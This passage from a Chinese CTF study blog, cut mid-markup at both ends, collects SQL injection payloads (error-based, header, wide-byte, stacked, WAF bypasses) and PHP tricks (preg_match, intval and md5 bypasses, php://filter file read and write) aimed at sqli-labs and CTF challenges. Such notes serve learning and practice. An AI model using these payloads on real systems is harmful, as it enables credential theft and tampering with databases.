class="hljs-string">&#x27;^&#x27;</span>),1) --+<br><br>?<span class="hljs-attribute">id</span>=1&quot;||updatexml(1,concat(0x7e,(select(database())),0x7e),1)#<br></code></pre></td></tr></table></figure><p>获取当前数据库中表的名字</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> updatexml(1,concat(<span class="hljs-string">&#x27;^&#x27;</span>,(select table_name <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span> limit 0,1),<span class="hljs-string">&#x27;^&#x27;</span>),1) --+<br><br>?<span class="hljs-attribute">id</span>=1&quot;||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;security&#x27;)),0x7e),1)#<br></code></pre></td></tr></table></figure><p>在 table_schema&#x3D;’security’ 后加上 limit 0,1，显示第一行（显示第0行的往下一行，不包括第0行）如果要看第二行则，limit1,1（第一行的往下一行，不包括第一行，即显示第二行），看第三行则limit2,1。</p><p>爆表中的字段</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> updatexml(1,concat(<span class="hljs-string">&#x27;^&#x27;</span>,(select column_name <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-attribute">table_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span> limit 0,1 ),<span class="hljs-string">&#x27;^&#x27;</span>),1) --+<br><br>?<span class="hljs-attribute">id</span>=1&quot;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema=&#x27;security&#x27;)||(table_name=&#x27;users&#x27;)),0x7e),1)#<br></code></pre></td></tr></table></figure><p>爆字段中的内容</p><pre><code class="hljs">?id=1&#39; and updatexml(1,concat(&#39;^&#39;,(select group_concat(username,&quot;--&quot;,password) from users limit 0,1 ),&#39;^&#39;),1) --+?id=1&quot;||(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))),1))#?id=1&quot;||(updatexml(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;)))),1))#</code></pre><p>基于布尔的盲注</p><p>布尔盲注，即在页面没有错误回显时完成的注入攻击。此时我们输入的语句让页面呈现出两种状态，相当于true和false，根据这两种状态可以判断我们输入的语句是否查询成功。以less-8关为例</p><p>基于时间的盲注</p><p>也叫延时注入。通过观察页面，既没有回显数据库内容，又没有报错信息也没有布尔类型状态，那么我们可以考虑用“绝招”–延时注入。延时注入就是将页面的时间线作为判断依据，一点一点注入出数据库的信息。我们以第9关为例，在id&#x3D;1后面加单引号或者双引号，页面不会发生任何改变，所以我们考虑绝招延时注入。</p><h3 id="HTTP头注入"><a href="#HTTP头注入" class="headerlink" title="HTTP头注入"></a>HTTP头注入</h3><p>常见的sql注入一般是通过请求参数或者表单进行注入，而HTTP头部注入是通过HTTP协议头部字段值进行注入。http头注入常存在于以下地方</p><img src="/2023/04/19/web%E5%AD%A6%E4%B9%A0/sql%E6%B3%A8%E5%85%A5/sql/f24cdf11d12a955e5740996b44dd20d8.png" class title="This is an test image"><p>产生注入的条件：</p><ul><li><p>能够对请求头消息进行修改</p></li><li><p>修改的请求头信息能够带入数据库进行查询</p></li><li><p>数据库没有对输入的请求信息做过滤</p></li></ul><ol><li>User-Agent注入</li></ol><p>User-Agent：使得服务器能够识别客户使用的操作系统，浏览器版本等。（很多数据量大的网站中会记录客户使用的操作系统或浏览器版本等然后将其存入数据库中）。这里获取User-Agent就可以知道客户都是通过什么浏览器访问系统的，然后将其值保存到数据库中。</p><p>以sqli-labs less-18关为例，登录用户密码：dumb ,0</p><p>1.1 判断注入点：user-agent值后面加上’，引发报错，确定存在sql注入</p><p>1.2 采用报错注入函数获取当前数据库名</p><p>‘ and updatexml(1,concat(‘^’,(database()),’^’),1) and ‘</p><ol start="2"><li>cookie注入</li></ol><p>cookie：服务器端用来记录客户端的状态。由服务端产生，保存在浏览器中。以sqli-labs less-20关为例，登录后</p><p>2.1 首先判断注入点，加 ‘ 单引号报错</p><p>2.2 采用报错注入函数获取当前数据库名</p><p>‘ and updatexml(1,concat(‘^’,(database()),’^’),1) and ‘</p><ol start="3"><li>Referer注入</li></ol><p>Referer：是HTTP header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。</p><p>以19关为例</p><ol><li><p>判断输入点，加单引号引发报错</p></li><li><p>使用报错注入函数：</p></li></ol><p>‘ and updatexml(1,concat(0x7e,(database()),0x7e),0) and ‘</p><ol start="4"><li>X-Forwarded-For 注入 详情</li></ol><p>X-Forwarded-For(XFF)：用来识别客户端最原始的ip地址。</p><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>宽字节是指多个字节宽度的编码，GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。转义函数在对这些编码进行转义时会将转义字符 ‘\’ 转为 %5c ,于是我们在他前面输入一个单字符编码与它组成一个新的多字符编码，使得原本的转义字符没有发生作用。</p><p>由于在数据库查询前使用了GBK多字节编码，即在汉字编码范围内使用两个字节会被编码为一个汉字（前一个ascii码要大于128，才到汉字的范围）。然后mysql服务器会对查询语句进行GBK编码，即下面所说的</p><pre><code class="hljs">   我们在前面加上 %df&#39;  ,转义函数会将%df’改成%df\’ , 而\ 就是%5c ，即最后变成了%df%5c&#39;，而%df%5c在GBK中这两个字节对应着一个汉字 “運” ，就是说 \ 已经失去了作用，%df &#39; ,被认为運&#39; ,成功消除了转义函数的影响。</code></pre><p>‘           %27<br>\           %5c<br>%df&#39;    %df%5c’ &#x3D;》  運’</p><p>宽字节注入方法</p><ol><li>黑盒</li></ol><p>就是上面所述的，在注入点后面加%df，然后按照正常的注入流程开始注入即可。如果我们需要使用sqlmap进行检测注入的话也需要在注入点后面加%df然后再用sqlmap跑，否则是注入不出来的，如</p><p>sqlmap.py -u “<a href="http://localhost/sqli-labs-master/Less-32/?id=1%EF%BF%BD%27">http://localhost/sqli-labs-master/Less-32/?id=1%df%27</a>“</p><ol start="2"><li>白盒</li></ol><p>查看mysql是否为GBK编码，且是否使用preg_replace()把单引号转换成&#39;或自带函数addslashes()进行转义</p><h3 id="堆叠查询"><a href="#堆叠查询" class="headerlink" title="堆叠查询"></a>堆叠查询</h3><p>堆叠查询也叫堆叠注入，在SQL中，分号（;）是用来表<br>示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。以sqli-labs第38关为例</p><img src="/2023/04/19/web%E5%AD%A6%E4%B9%A0/sql%E6%B3%A8%E5%85%A5/sql/f881db8992c8beb5993dc652c3ccb334.png" class title="This is an test image"><p>执行id&#x3D;1’;update users set password&#x3D;’123456’ where id&#x3D;1; –+<br>更新id&#x3D;1的用户密码为123456。如下成功执行了更新密码的语句</p><img src="/2023/04/19/web%E5%AD%A6%E4%B9%A0/sql%E6%B3%A8%E5%85%A5/sql/889908a4d86bc80ef4574c3a80b360e6.png" class title="This is an test image"><h3 id="二阶注入"><a href="#二阶注入" class="headerlink" title="二阶注入"></a>二阶注入</h3><p>二次注入漏洞是一种在Web应用程序中广泛存在的安全漏洞形式。相对于一次注入漏洞而言，二次注入漏洞更难以被发现，但是它却具有与—次注入攻击漏洞相同的攻击威力。</p><pre><code class="hljs">黑客通过构造数据的形式，在浏览器或者其他软件中提交HTTP数据报文请求到服务端进行处理，提交的数据报文请求中可能包含了黑客构造的SQL语句或者命令。服务端应用程序会将黑客提交的数据信息进行存储，通常是保存在数据库中，保存的数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响应。黑客向服务端发送第二个与第一次不相同的请求数据信息。服务端接收到黑客提交的第二个请求信息后，为了处理该请求，服务端会查询数据库中已经存储的数据信息并处理，从而导致黑客在第一次请求中构造的SQL语句或者命令在服务端环境中执行。服务端返回执行的处理结果数据信息，黑客可以通过返回的结果数据信息判断二次注入漏洞利用是否成功</code></pre><p>总结，二次注入就是由于将数据存储进数据库中时未做好过滤，先提交构造好的特殊字符请求存储进数据库，然后提交第二次请求时与第一次提交进数据库中的字符发生了作用，形成了一条新的sql语句导致被执行。</p><h2 id="sql注入绕过"><a href="#sql注入绕过" class="headerlink" title="sql注入绕过"></a>sql注入绕过</h2><h3 id="注释符号绕过"><a href="#注释符号绕过" class="headerlink" title="注释符号绕过"></a>注释符号绕过</h3><p>常用的注释符有</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">-- 注释内容<br><span class="hljs-comment"># 注释内容</span><br><span class="hljs-regexp">/*注释内容*/</span><br>;<br></code></pre></td></tr></table></figure><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>常用于 <code>waf</code>的正则对大小写不敏感的情况，一般都是题目自己故意这样设计。<br>例如：过滤了关键字<code>select</code>，可以尝试使用<code>Select</code>等绕过。</p><h3 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h3><p>内联注释就是把一些特有的仅在MYSQL上的语句放在 <code>/*!...*/</code> 中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中会执行。</p><h3 id="双写关键字绕过"><a href="#双写关键字绕过" class="headerlink" title="双写关键字绕过"></a>双写关键字绕过</h3><p>在某一些简单的<code>waf</code>中，将关键字<code>select</code>等只使用<code>replace()</code>函数置换为空，这时候可以使用双写关键字绕过。例如<code>select</code>变成<code>seleselectct</code>，在经过<code>waf</code>的处理之后又变成<code>select</code>，达到绕过的要求。</p><h3 id="特殊编码绕过"><a href="#特殊编码绕过" class="headerlink" title="特殊编码绕过"></a>特殊编码绕过</h3><ul><li>十六进制绕过</li><li>ascii编码绕过</li></ul><h3 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h3><p>一般绕过空格过滤的方法有以下几种方法来取代空格</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-comment">/**/</span><br><span class="hljs-comment">()</span><br>回车<span class="hljs-comment">(url编码中的%0a)</span><br>`<span class="hljs-comment">(tap键上面的按钮)</span><br>tap<br>两个空格<br></code></pre></td></tr></table></figure><h3 id="过滤or-and-xor-not-绕过"><a href="#过滤or-and-xor-not-绕过" class="headerlink" title="过滤or and xor not 绕过"></a>过滤or and xor not 绕过</h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">and</span> = &amp;&amp;<br><span class="hljs-attr">or</span> = ||<br><span class="hljs-attr">xor</span> = | <span class="hljs-comment"># 异或</span><br><span class="hljs-attr">not</span> = !<br></code></pre></td></tr></table></figure><h3 id="过滤等号-x3D-绕过"><a href="#过滤等号-x3D-绕过" class="headerlink" title="过滤等号&#x3D;绕过"></a>过滤等号&#x3D;绕过</h3><p>like: 不加<code>通配符</code>的<code>like</code>执行的效果和<code>=</code>一致，所以可以用来绕过。</p><p>rlike: 模糊匹配，只要字段的值中存在要查找的 部分 就会被选择出来<br>用来取代<code>=</code>时，<code>rlike</code>的用法和上面的<code>like</code>一样，没有通配符效果和<code>=</code>一样</p><p>regexp: MySQL中使用 REGEXP 操作符来进行正则表达式匹配</p><p>使用大小于号来绕过</p><p>&lt;&gt;: 等价于 !&#x3D;,所以在前面再加一个<code>!</code>结果就是等号了</p><h3 id="过滤大小于号绕过"><a href="#过滤大小于号绕过" class="headerlink" title="过滤大小于号绕过"></a>过滤大小于号绕过</h3><p>·greatest(n1, n2, n3…):返回n中的最大值</p><p>·least(n1,n2,n3…):返回n中的最小值</p><p>·strcmp(str1,str2):若所有的字符串均相同，则返回STRCMP()，若根据当前分类次序，第一个参数小于第二个，则返回 -1，其它情况返回 ·in关键字</p><p>·between a and b:范围在a-b之间</p><h3 id="过滤引号绕过"><a href="#过滤引号绕过" class="headerlink" title="过滤引号绕过"></a>过滤引号绕过</h3><p>·使用十六进制</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span>  <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-number">0x7573657273</span>;<br></code></pre></td></tr></table></figure><p>·使用宽字节</p><p>常用在web应用使用的字符集为<code>GBK</code>时，并且过滤了引号，就可以试试宽字节。</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm"># 过滤单引号时<br><span class="hljs-variable">%bf</span><span class="hljs-variable">%27</span> <span class="hljs-variable">%df</span><span class="hljs-variable">%27</span> <span class="hljs-variable">%aa</span><span class="hljs-variable">%27</span><br><span class="hljs-variable">%df</span>\’ <span class="hljs-operator">=</span> <span class="hljs-variable">%df</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%27</span><span class="hljs-operator">=</span>縗’<br></code></pre></td></tr></table></figure><h3 id="过滤逗号绕过"><a href="#过滤逗号绕过" class="headerlink" title="过滤逗号绕过"></a>过滤逗号绕过</h3><p>如果waf过滤了逗号，并且只能盲注（盲注基本离不开逗号啊喂），在取子串的几个函数中，有一个替代逗号的方法就是使用<code>from pos for len</code>，其中pos代表从pos个开始读取len长度的子串<br>例如在<code>substr()</code>等函数中，常规的写法是</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">select</span> substr(<span class="hljs-string">&quot;string&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>);<br></code></pre></td></tr></table></figure><p>如果过滤了逗号，可以这样使用<code>from pos for len</code>来取代</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> substr(&quot;string&quot; <span class="hljs-keyword">from</span> <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> <span class="hljs-number">3</span>);<br>在学习大佬wp时还看到利用<span class="hljs-keyword">join</span>绕过逗号过滤，tql<br><br>?id=<span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,3--+</span><br><span class="hljs-string"></span><br><span class="hljs-string">不用逗号</span><br><span class="hljs-string"></span><br><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>)a <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">2</span>)b <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">3</span>)c<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h3 id="过滤函数绕过"><a href="#过滤函数绕过" class="headerlink" title="过滤函数绕过"></a>过滤函数绕过</h3><p>·sleep() –&gt;benchmark()</p><p>·ascii()–&gt;hex()、bin()<br>替代之后再使用对应的进制转string即可</p><p>·group_concat()–&gt;concat_ws()</p><p>·substr(),substring(),mid()可以相互取代, 取子串的函数还有left(),right()</p><p>·user() –&gt; @@user、datadir–&gt;@@datadir</p><p>·ord()–&gt;ascii():这两个函数在处理英文时效果一样，但是处理中文等时不一致。</p><p>·information_schema.tables-&gt;mysql.innodb_table_stats &#x2F; mysql.innodb_index_stats表下分别是database_name,table_name,index_name</p><p>sys数据库中的以下三个视图中存储了表名table_name:</p><ul><li>sys.schema_auto_increment_columns #存在自增主键的表会出现在此视图</li><li>sys.schema_table_statistics_with_buffer #数据来源视图</li><li>sys.x$schema_table_statistics_with_buffer #数据来源视图</li></ul><p>（注：部分内容借鉴于这位大佬的博客<a href="https://huanghelouzi.blog.csdn.net/article/details/82995313?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_antiscan_v2&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_antiscan_v2&utm_relevant_index=2">点我跳转</a>）</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>group_concat的使用</title>
    <link href="/2023/04/19/web%E5%AD%A6%E4%B9%A0/sql%E6%B3%A8%E5%85%A5/group-concat%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2023/04/19/web%E5%AD%A6%E4%B9%A0/sql%E6%B3%A8%E5%85%A5/group-concat%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>group_concat的使用<br>mysql中的information_schema 结构用来存储数据库系统信息 </p><p>information_schema 结构中这几个表存储的信息，在注射中可以用到的几个表。　 </p><p>| SCHEMATA ――&gt;存储数据库名的， </p><p>|——&gt;关键字段：SCHEMA_NAME，表示数据库名称 </p><p>| TABLES ――&gt;存储表名的 </p><p>|——&gt;关键字段：TABLE_SCHEMA表示表所属的数据库名称； </p><p>TABLE_NAME表示表的名称 </p><p>| COLUMNS ――&gt;存储字段名的 </p><p>|——&gt;关键字段：TABLE_SCHEMA表示表所属的数据库名称； </p><p>TABLE_NAME表示所属的表的名称 </p><p>　　　　COLUMN_NAME表示字段名 </p><p>可以看到，我们只要通过注射点构造查询语句遍相关字段，就可以得到我们想要的信息了。 </p><p>爆所有数据库名 </p><p>select group_concat(SCHEMA_NAME) from information_schema.schemata </p><p>得到当前库的所有表 </p><p>select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() </p><p>得到表中的字段名 将敏感的表进行16进制编码adminuser&#x3D;0x61646D696E75736572 </p><p>select group_concat(column_name) from information_schema.columns where table_name&#x3D;0x61646D696E75736572 </p><p>得到字段具体的值 </p><p>select group_concat(username,0x3a,password) from adminuser</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctf中php特性</title>
    <link href="/2023/04/09/web%E5%AD%A6%E4%B9%A0/sql%E6%B3%A8%E5%85%A5/ctf%E4%B8%AD%E7%9A%84php%E7%89%B9%E6%80%A7/"/>
    <url>/2023/04/09/web%E5%AD%A6%E4%B9%A0/sql%E6%B3%A8%E5%85%A5/ctf%E4%B8%AD%E7%9A%84php%E7%89%B9%E6%80%A7/</url>
    
    <content type="html"><![CDATA[<h1 id="ctf中php特性"><a href="#ctf中php特性" class="headerlink" title="ctf中php特性"></a>ctf中php特性</h1><h2 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match()"></a>preg_match()</h2><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs smali">preg_match()<span class="hljs-built_in"></span><br><span class="hljs-built_in">int </span>preg_match ( string $pattern , string $subject [,<span class="hljs-built_in"> array </span>&amp;$matches [,<span class="hljs-built_in"> int </span>$flags = 0 [,<span class="hljs-built_in"> int </span>$offset = 0 ]]] )<br></code></pre></td></tr></table></figure><p><a href="https://www.runoob.com/php/php-preg_match.html">runoob</a></p><h3 id="1数组绕过"><a href="#1数组绕过" class="headerlink" title="1数组绕过"></a>1数组绕过</h3><p>preg_match()只能处理字符串，当传入的subject是数组时会返回false</p><h3 id="2换行绕过"><a href="#2换行绕过" class="headerlink" title="2换行绕过"></a>2换行绕过</h3><p>cmd&#x3D;%0aphp</p><h3 id="3最大回溯次数绕过"><a href="#3最大回溯次数绕过" class="headerlink" title="3最大回溯次数绕过"></a>3最大回溯次数绕过</h3><p>PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit<br>回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import requests<br><span class="hljs-attribute">url</span>=<span class="hljs-string">&quot;http://15bdcf89-9e10-4205-b3b4-6b3a0e45651a.chall.ctf.show:8080/&quot;</span><br>data=&#123;<br><span class="hljs-string">&#x27;f&#x27;</span>:<span class="hljs-string">&#x27;very&#x27;</span><span class="hljs-number">*250000</span>+<span class="hljs-string">&#x27;ctfshow&#x27;</span><br>&#125;<br><span class="hljs-attribute">r</span>=requests.post(url,data=data)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><h2 id="intval"><a href="#intval" class="headerlink" title="intval()"></a>intval()</h2><p><code>int intval ( mixed $var [, int $base = 10 ] )</code><br>intval() 函数用于获取变量的整数值。<br><a href="https://www.runoob.com/php/php-intval-function.html">runoob</a></p><h3 id="1字符绕过"><a href="#1字符绕过" class="headerlink" title="1字符绕过"></a>1字符绕过</h3><p>intval()而言，如果参数是字符串，则返回字符串中第一个不是数字的字符之前的数字串所代表的整数值。如果字符串第一个是‘-’，则从第二个开始算起。<br>payload：num&#x3D;4476a</p><h3 id="2科学计数法"><a href="#2科学计数法" class="headerlink" title="2科学计数法"></a>2科学计数法</h3><p>intval()int函数如果b a s e 为 0 则 base为0则base为0则var中存在字母的话遇到字母就停止读取 但是e这个字母比较特殊，可以在PHP中表示科学计数法。</p><h3 id="3进制转换"><a href="#3进制转换" class="headerlink" title="3进制转换"></a>3进制转换</h3><p>0b?? : 二进制<br>0??? : 八进制<br>0X?? : 十六进制<br>payload：num&#x3D;010574（4476）</p><h3 id="4小数点绕过"><a href="#4小数点绕过" class="headerlink" title="4小数点绕过"></a>4小数点绕过</h3><p>过滤了开头是‘0’的字符串<br>进制转换绕过不可行了，只能通过小数点，使得intval()转变为int()<br>payload：num&#x3D;4476.0</p><h2 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h2><p><a href="https://www.freesion.com/article/53561386476/">md5</a></p><h3 id="1强类型比较"><a href="#1强类型比较" class="headerlink" title="1强类型比较"></a>1强类型比较</h3><p>两个md5后的值采用严格比较，没有规定字符串如果这个时候传入的是数组不是字符串，可以利用md5()函数的缺陷进行绕过<br>md5() 函数不能处理数组，数组都返回 null，md5(a[]) 结果为 null。</p><h3 id="2弱类型比较"><a href="#2弱类型比较" class="headerlink" title="2弱类型比较"></a>2弱类型比较</h3><p>只要两个数的md5加密后的值以0e开头就可以绕过，因为php在进行弱类型比较（即&#x3D;&#x3D;)时,会现转换字符串的类型，在进行比较，而在比较是因为两个数都是以0e开头会被认为是科学计数法，0e后面加任何数在科学计数法中都是0，所以两数相等</p><h3 id="3md5碰撞"><a href="#3md5碰撞" class="headerlink" title="3md5碰撞"></a>3md5碰撞</h3><p>真实md5碰撞，因为此时不能输入数组了，只能输入字符串</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">a<span class="hljs-operator">=</span>M<span class="hljs-variable">%C9h</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%0</span>E<span class="hljs-variable">%E3</span><span class="hljs-variable">%5</span>C<span class="hljs-variable">%20</span><span class="hljs-variable">%95</span>r<span class="hljs-variable">%D4w</span><span class="hljs-variable">%7</span>Br<span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%D3o</span><span class="hljs-variable">%A7</span><span class="hljs-variable">%B2</span><span class="hljs-variable">%1</span>B<span class="hljs-variable">%DCV</span><span class="hljs-variable">%B7J</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%C0x</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%7</span>B<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%BF</span><span class="hljs-variable">%A2</span><span class="hljs-variable">%00</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%28</span>K<span class="hljs-variable">%F3n</span><span class="hljs-variable">%8</span>EKU<span class="hljs-variable">%B3_Bu</span><span class="hljs-variable">%93</span><span class="hljs-variable">%D8Igm</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%D1U</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%FB_</span><span class="hljs-variable">%07</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%A2</span><br>&amp;b<span class="hljs-operator">=</span>M<span class="hljs-variable">%C9h</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%0</span>E<span class="hljs-variable">%E3</span><span class="hljs-variable">%5</span>C<span class="hljs-variable">%20</span><span class="hljs-variable">%95</span>r<span class="hljs-variable">%D4w</span><span class="hljs-variable">%7</span>Br<span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%D3o</span><span class="hljs-variable">%A7</span><span class="hljs-variable">%B2</span><span class="hljs-variable">%1</span>B<span class="hljs-variable">%DCV</span><span class="hljs-variable">%B7J</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%C0x</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%7</span>B<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%BF</span><span class="hljs-variable">%A2</span><span class="hljs-variable">%02</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%28</span>K<span class="hljs-variable">%F3n</span><span class="hljs-variable">%8</span>EKU<span class="hljs-variable">%B3_Bu</span><span class="hljs-variable">%93</span><span class="hljs-variable">%D8Igm</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%D1</span><span class="hljs-variable">%D5</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%FB_</span><span class="hljs-variable">%07</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%A2</span><br></code></pre></td></tr></table></figure><h2 id="优先级"><a href="#优先级" class="headerlink" title="优先级"></a>优先级</h2><h3 id="符号"><a href="#符号" class="headerlink" title="符号"></a>符号</h3><p>&amp;&amp;与||的优先级高于&#x3D;<br>&#x3D;的优先级高于and与or</p><h3 id="get-post"><a href="#get-post" class="headerlink" title="get post"></a>get post</h3><p>http协议默认先以get方式获取数据，无论是否以哪种方式发起的，总是get方式优先，即通过get方式获取到了数据就不会再去通过post方式获取一遍，如果get方式获取不到，再以post方式获取。</p><h2 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h2><h3 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h3><p>配合file_put_contents(v 3 , v3,v3,str);函数 &#x2F;&#x2F;在需要base64转换的时候</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">v3=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/write=convert.base64-decode/</span>resource=<span class="hljs-number">1</span>.php&amp;str=......<br></code></pre></td></tr></table></figure><h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><p>通常我们使用:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure><p>当ban掉base64的时候，我们还可以用其他编码方式（或者不编码）：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter/resource=flag.php<br>php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.iconv.UCS-2LE.UCS-2BE/</span>resource=flag.php<br>php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.quoted-printable-encode/</span>resource=flag.php<span class="hljs-regexp">//</span>可打印字符引用编码<br>compress.zlib:<span class="hljs-regexp">//</span>flag.php<span 